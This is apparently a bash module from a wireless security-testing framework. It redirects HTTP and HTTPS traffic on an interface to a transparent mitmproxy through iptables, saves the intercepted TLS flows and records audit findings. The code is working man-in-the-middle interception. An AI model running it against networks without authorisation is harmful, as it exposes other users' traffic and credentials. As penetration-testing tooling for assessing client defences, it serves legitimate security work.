#!/usr/bin/env bash
# MODULE_META
# NAME="SSL/TLS Interception"
# CATEGORY="G"
# DEPS="G1"
# CRITICAL="no"
# TOOLS="mitmproxy,iptables"
# DESC="Test for SSL/TLS interception susceptibility (HSTS, certificate pinning)"
# REQS="managed_iface"
# PCAP="no"
# DECODE="tls"

#===============================================================================
#  modules/g2_ssl_interception.sh
#  G2: SSL/TLS Interception (Golden Wrapper)
#
#  METHODOLOGY:
#  1. Position the local system as a MITM (via G1).
#  2. Use iptables to redirect transit HTTP/HTTPS traffic to a local transparent
#     proxy (mitmproxy).
#  3. Attempt to decrypt TLS traffic using a spoofed CA certificate.
#  4. Monitor for clients that ignore certificate warnings or lack HSTS/Pinning.
#===============================================================================

set -euo pipefail

C_PROMPT="${ASTRA_COLOR_PROMPT:-}"
C_VAR="${ASTRA_COLOR_VAR:-}"
C_BOLD="${ASTRA_COLOR_BOLD:-}"
C_ACTION="${ASTRA_COLOR_ACTION:-}"
C_RESET="${ASTRA_COLOR_RESET:-}"


# Inputs from Environment
INTERFACE="${WIFI_INTERFACE:-}"
SESSION_DIR="${SESSION_DIR:-.}"
EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
EVIDENCE_PREFIX="${EVIDENCE_DIR}/g2"
SCAN_TIME="${SCAN_TIME:-60}"
ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
TC_ID="G2"

if [[ -z "$INTERFACE" ]]; then
    echo "[!] WIFI_INTERFACE not set."
    exit 1
fi

echo "[*] Testing SSL/TLS interception susceptibility on ${INTERFACE}..."

MITM_LOG="${EVIDENCE_DIR}/${TC_ID}_mitmproxy.log"
FLOW_FILE="${EVIDENCE_PREFIX}_flows.mitm"

# Cleanup function
cleanup() {
    echo "[*] Cleaning up SSL interception processes..."
    [[ -n "${MITM_PID:-}" ]] && kill "$MITM_PID" 2>/dev/null || true
    iptables -t nat -D PREROUTING -i "$INTERFACE" -p tcp --dport 80 -j REDIRECT --to-port 8080 2>/dev/null || true
    iptables -t nat -D PREROUTING -i "$INTERFACE" -p tcp --dport 443 -j REDIRECT --to-port 8080 2>/dev/null || true
}
trap cleanup EXIT

# 1. Start mitmproxy
if command -v mitmproxy &>/dev/null; then
    echo "[*] Starting mitmproxy transparent proxy..."
    
    # Setup iptables redirect
    iptables -t nat -A PREROUTING -i "$INTERFACE" -p tcp --dport 80 -j REDIRECT --to-port 8080 || true
    iptables -t nat -A PREROUTING -i "$INTERFACE" -p tcp --dport 443 -j REDIRECT --to-port 8080 || true
    
    mitmproxy --mode transparent --save-stream "$FLOW_FILE" > "$MITM_LOG" 2>&1 &
    MITM_PID=$!

    sleep "$SCAN_TIME"
    
    cleanup
    trap - EXIT
    
    "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 90 --status "Reviewing SSL flows..."

    # 2. Reporting
    if [[ -f "$FLOW_FILE" && -s "$FLOW_FILE" ]]; then
        "$ASTRA_BIN" record-finding \
            --session-dir "$SESSION_DIR" \
            --tc "$TC_ID" \
            --type vulnerability \
            --name "SSL Interception Vulnerability Confirmed" \
            --severity HIGH \
            --desc "Successfully intercepted and recorded TLS flows on $INTERFACE." \
            --target "Local Clients" \
            --evidence "$FLOW_FILE" \
            --rationale "Testing for SSL interception vulnerability identifies clients that are susceptible to credential theft via spoofed certificates. Successful flow capture indicates lack of HSTS enforcement or certificate pinning in target applications."
    else
        "$ASTRA_BIN" record-finding \
            --session-dir "$SESSION_DIR" \
            --tc "$TC_ID" \
            --type vulnerability \
            --name "[G2] Audit Complete" \
            --severity INFO \
            --desc "Completed SSL/TLS interception test. No active traffic was intercepted by the transparent proxy." \
            --target "Local Clients" \
            --evidence "$MITM_LOG" \
            --rationale "While the proxy was active, no clients attempted connections that could be intercepted. This indicates either low client activity or effective mitigation on the client side."
    fi
else
    echo "[!] mitmproxy not found. Skipping SSL interception test."
    exit 1
fi

exit 0
0
